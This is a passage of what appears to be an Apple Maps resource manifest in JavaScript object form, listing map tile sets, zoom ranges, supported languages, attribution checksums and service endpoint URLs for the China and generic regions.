                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 2162,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 69,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 21,
            },
          ],
        },
        {
          scale: 0,
          style: 72,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
              ],
              identifier: 2,
              timeToLiveSeconds: 3600,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 73,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 475,
            },
          ],
        },
        {
          scale: 0,
          style: 76,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-cn-ssl.ls.apple.com/sis/v1",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 524287,
                  minZ: 19,
                  minX: 0,
                  maxY: 524287,
                  minY: 0,
                  maxZ: 19,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 86400,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 79,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
              ],
              identifier: 29,
            },
          ],
        },
        {
          scale: 0,
          style: 84,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-2-cn-ssl.ls.apple.com/poi_update",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 2162,
              timeToLiveSeconds: 1800,
              genericTile: [],
            },
          ],
        },
      ],
      urlInfoSet: [
        {
          backgroundRevGeoURL: {
            url: "https://dispatcher.is.autonavi.com/dispatcher",
            supportsMultipathTCP: !1,
          },
          searchAttributionManifestURL: {
            url: "https://gspe21-ssl.ls.apple.com/config/search-attribution-1293",
            supportsMultipathTCP: !1,
          },
          analyticsSessionlessURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          poiBusynessActivityCollectionURL: {
            url: "https://gsp53-ssl.ls.apple.com/hvr/rt_poi_activity",
            supportsMultipathTCP: !1,
          },
          offlineDataDownloadBaseURL: {
            url: "https://gspe121-cn-ssl.ls.apple.com",
            supportsMultipathTCP: !1,
          },
          wifiConnectionQualityProbeURL: {
            url: "https://gsp10-ssl-cn.ls.apple.com/hvr/wcq",
            supportsMultipathTCP: !1,
          },
          junctionImageServiceURL: {
            url: "https://direction2.is.autonavi.com/direction",
            supportsMultipathTCP: !1,
          },
          etaURL: {
            url: "https://direction2.is.autonavi.com/direction",
            supportsMultipathTCP: !1,
          },
          analyticsCohortSessionURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          resourcesURL: {
            url: "https://gspe21-ssl.ls.apple.com/",
            supportsMultipathTCP: !1,
          },
          feedbackLookupURL: {
            url: "https://rap.is.autonavi.com/lookup",
            supportsMultipathTCP: !1,
          },
          batchTrafficProbeURL: {
            url: "https://gsp10-ssl.ls.apple.com/hvr/v2/loc",
            supportsMultipathTCP: !1,
          },
          batchReverseGeocoderURL: {
            url: "https://batch-rgeo.is.autonavi.com/batchRGeo",
            supportsMultipathTCP: !1,
          },
          spatialLookupURL: {
            url: "https://spatialsearch.is.autonavi.com/spatialsearch",
            supportsMultipathTCP: !1,
          },
          realtimeTrafficProbeURL: {
            url: "https://gsp9-ssl.apple.com/hvr/v2/rtloc",
            supportsMultipathTCP: !1,
          },
          wifiQualityTileURL: {
            url: "https://gspe85-cn-ssl.ls.apple.com/wifi_request_tile",
            supportsMultipathTCP: !1,
          },
          problemSubmissionURL: {
            url: "https://rap.is.autonavi.com/rap",
            supportsMultipathTCP: !1,
          },
          reverseGeocoderVersionsURL: {
            url: "https://gspe21-ssl.ls.apple.com/config/revgeo-version-11.plist",
            supportsMultipathTCP: !1,
          },
          problemCategoriesURL: {
            url: "https://gspe21-ssl.ls.apple.com/config/com.apple.GEO.BusinessLocalizedCategories-480.plist",
            supportsMultipathTCP: !1,
          },
          batchReverseGeocoderPlaceRequestURL: {
            url: "https://dispatcher.is.autonavi.com/dispatcher",
            supportsMultipathTCP: !1,
          },
          wifiQualityURL: {
            url: "https://gsp85-cn-ssl.ls.apple.com/wifi_request",
            supportsMultipathTCP: !1,
          },
          polyLocationShiftURL: {
            url: "https://shift.is.autonavi.com/localshift",
            supportsMultipathTCP: !1,
          },
          problemStatusURL: {
            url: "https://rap.is.autonavi.com/rapstatus",
            supportsMultipathTCP: !1,
          },
          feedbackSubmissionURL: {
            url: "https://rap.is.autonavi.com/rap",
            supportsMultipathTCP: !1,
          },
          offlineDataBatchListURL: {
            url: "https://ods.is.autonavi.com/api/batchesForRegion",
            supportsMultipathTCP: !1,
          },
          offlineDataSizeURL: {
            url: "https://ods.is.autonavi.com/api/sizeForRegion",
            supportsMultipathTCP: !1,
          },
          analyticsShortSessionURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          alternateResourcesURL: [
            {
              url: "https://cdn.apple-mapkit.com/rap",
              supportsMultipathTCP: !1,
            },
            {
              url: "https://limit-rule.is.autonavi.com/lpr/rules/download",
              supportsMultipathTCP: !1,
            },
          ],
          abExperimentURL: {
            url: "https://gsp-ssl.ls.apple.com/cn/ab.arpc",
            supportsMultipathTCP: !1,
          },
          logMessageUsageURL: {
            url: "https://gsp64-ssl.ls.apple.com/a/v2/use",
            supportsMultipathTCP: !1,
          },
          rapWebBundleURL: {
            url: "https://cdn.apple-mapkit.com/rap",
            supportsMultipathTCP: !1,
          },
          dispatcherURL: {
            url: "https://dispatcher.is.autonavi.com/dispatcher",
            supportsMultipathTCP: !1,
          },
          simpleETAURL: {
            url: "https://direction2.is.autonavi.com/direction",
            supportsMultipathTCP: !1,
          },
          analyticsLongSessionURL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          backgroundDispatcherURL: {
            url: "https://dispatcher.is.autonavi.com/dispatcher",
            supportsMultipathTCP: !1,
          },
          webModuleBaseURL: {
            url: "https://placecard-server-wm.is.autonavi.com",
            supportsMultipathTCP: !1,
          },
          directionsURL: {
            url: "https://direction2.is.autonavi.com/direction",
            supportsMultipathTCP: !1,
          },
          logMessageUsageV3URL: {
            url: "https://gsp64-ssl.ls.apple.com/hvr/v3/use",
            supportsMultipathTCP: !1,
          },
          announcementsURL: {
            url: "https://gspe35-ssl.ls.apple.com/config/announcements?environment=prod-cn",
            supportsMultipathTCP: !1,
          },
        },
      ],
      muninBucket: [
        { bucketID: 2, bucketURL: "https://gspe72-cn-ssl.ls.apple.com/mnn_us" },
        { bucketID: 6, bucketURL: "https://gspe72-cn-ssl.ls.apple.com/mnn_us" },
      ],
    },
    XX: {
      attribution: [
        {
          region: [],
          name: "‎",
          url: "https://gspe21-ssl.ls.apple.com/html/attribution-277.html",
          resource: [],
          linkDisplayStringIndex: 0,
          plainTextURL:
            "https://gspe21-ssl.ls.apple.com/html/attribution-276.txt",
          plainTextURLSHA256Checksum: {
            0: 23,
            1: 205,
            2: 77,
            3: 134,
            4: 47,
            5: 251,
            6: 220,
            7: 223,
            8: 247,
            9: 82,
            10: 216,
            11: 183,
            12: 42,
            13: 22,
            14: 222,
            15: 4,
            16: 99,
            17: 19,
            18: 69,
            19: 96,
            20: 24,
            21: 89,
            22: 86,
            23: 22,
            24: 113,
            25: 203,
            26: 166,
            27: 27,
            28: 50,
            29: 153,
            30: 174,
            31: 96,
          },
        },
        {
          region: [
            { maxX: 183, minZ: 8, minX: 176, maxY: 122, minY: 110, maxZ: 21 },
            { maxX: 188, minZ: 8, minX: 178, maxY: 107, minY: 107, maxZ: 21 },
            { maxX: 183, minZ: 8, minX: 178, maxY: 109, minY: 108, maxZ: 21 },
            { maxX: 180, minZ: 8, minX: 180, maxY: 106, minY: 105, maxZ: 21 },
            { maxX: 183, minZ: 8, minX: 181, maxY: 106, minY: 104, maxZ: 21 },
            { maxX: 182, minZ: 8, minX: 182, maxY: 103, minY: 103, maxZ: 21 },
            { maxX: 184, minZ: 8, minX: 184, maxY: 106, minY: 104, maxZ: 21 },
            { maxX: 195, minZ: 8, minX: 184, maxY: 110, minY: 108, maxZ: 21 },
            { maxX: 194, minZ: 8, minX: 184, maxY: 111, minY: 111, maxZ: 21 },
            { maxX: 191, minZ: 8, minX: 184, maxY: 120, minY: 112, maxZ: 21 },
            { maxX: 184, minZ: 8, minX: 184, maxY: 121, minY: 121, maxZ: 21 },
            { maxX: 185, minZ: 8, minX: 185, maxY: 106, minY: 105, maxZ: 21 },
            { maxX: 190, minZ: 8, minX: 190, maxY: 107, minY: 107, maxZ: 21 },
            { maxX: 194, minZ: 8, minX: 193, maxY: 123, minY: 118, maxZ: 21 },
            { maxX: 195, minZ: 8, minX: 195, maxY: 118, minY: 118, maxZ: 21 },
          ],
          linkDisplayStringIndex: 0,
          name: "MMI",
          url: "https://gspe21-ssl.ls.apple.com/html/attribution-277.html",
          resource: [
            {
              region: [],
              filter: [],
              checksum: {
                0: 35,
                1: 54,
                2: 2,
                3: 219,
                4: 218,
                5: 184,
                6: 124,
                7: 50,
                8: 35,
                9: 32,
                10: 86,
                11: 20,
                12: 147,
                13: 223,
                14: 7,
                15: 41,
                16: 209,
                17: 238,
                18: 32,
                19: 41,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "mmi-mask-2.png",
              resourceType: 5,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 5,
                1: 160,
                2: 112,
                3: 185,
                4: 3,
                5: 255,
                6: 7,
                7: 75,
                8: 78,
                9: 139,
                10: 52,
                11: 81,
                12: 151,
                13: 231,
                14: 143,
                15: 29,
                16: 187,
                17: 109,
                18: 220,
                19: 80,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "mmi-mask-2@2x.png",
              resourceType: 5,
            },
            {
              region: [],
              filter: [],
              checksum: {
                0: 240,
                1: 170,
                2: 204,
                3: 91,
                4: 161,
                5: 113,
                6: 81,
                7: 101,
                8: 136,
                9: 205,
                10: 115,
                11: 2,
                12: 192,
                13: 97,
                14: 106,
                15: 34,
                16: 227,
                17: 214,
                18: 74,
                19: 220,
              },
              updateMethod: 0,
              validationMethod: 0,
              filename: "mmi-mask-2@3x.png",
              resourceType: 5,
            },
          ],
        },
        {
          region: [
            { maxX: 225, minZ: 8, minX: 218, maxY: 104, minY: 102, maxZ: 21 },
            { maxX: 228, minZ: 8, minX: 221, maxY: 101, minY: 98, maxZ: 21 },
            { maxX: 231, minZ: 8, minX: 226, maxY: 97, minY: 91, maxZ: 21 },
          ],
          linkDisplayStringIndex: 0,
          name: "© GeoTechnologies, Inc.",
          url: "https://gspe21-ssl.ls.apple.com/html/attribution-277.html",
          resource: [],
        },
      ],
      releaseInfo: "PROD (24.20)",
      tileSet: [
        {
          scale: 0,
          style: 1,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf?flags=8",
        },
        {
          scale: 0,
          style: 1,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
              ],
              identifier: 16330272,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
            { countryCode: "VN", region: "VN" },
          ],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf?flags=8",
        },
        {
          scale: 1,
          style: 7,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 1,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            {
              genericTile: [
                { resourceIndex: 1971, textureIndex: 0, tileType: 2 },
              ],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 22 },
              ],
              identifier: 9751,
            },
          ],
        },
        {
          scale: 2,
          style: 7,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 1,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe11-ssl.ls.apple.com/tile",
          validVersion: [
            {
              genericTile: [
                { resourceIndex: 1971, textureIndex: 0, tileType: 2 },
              ],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 22 },
              ],
              identifier: 9751,
            },
          ],
        },
        {
          scale: 0,
          style: 11,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16329310,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf?flags=1",
        },
        {
          scale: 0,
          style: 11,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 16330272,
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-kittyhawk-ssl.ls.apple.com/tile.vf?flags=1",
        },
        {
          scale: 0,
          style: 12,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              availableTiles: [
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16329310,
              timeToLiveSeconds: 120,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe12-ssl.ls.apple.com/traffic",
        },
        {
          scale: 0,
          style: 12,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [],
          validVersion: [
            {
              availableTiles: [
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16330272,
              timeToLiveSeconds: 120,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe12-kittyhawk-ssl.ls.apple.com/traffic",
        },
        {
          scale: 0,
          style: 13,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 0,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16329310,
              genericTile: [],
            },
          ],
          deviceSKUWhitelist: [],
          countryRegionWhitelist: [],
          baseURL: "https://gspe19-ssl.ls.apple.com/tile.vf?flags=2",
        },
        {
          scale: 0,
          style: 13,
          checksumType: 0,
          requestStyle: 1,
          supportsMultipathTCP: !1,
          dataSet: 1,
          size: 2,
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "es-US",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
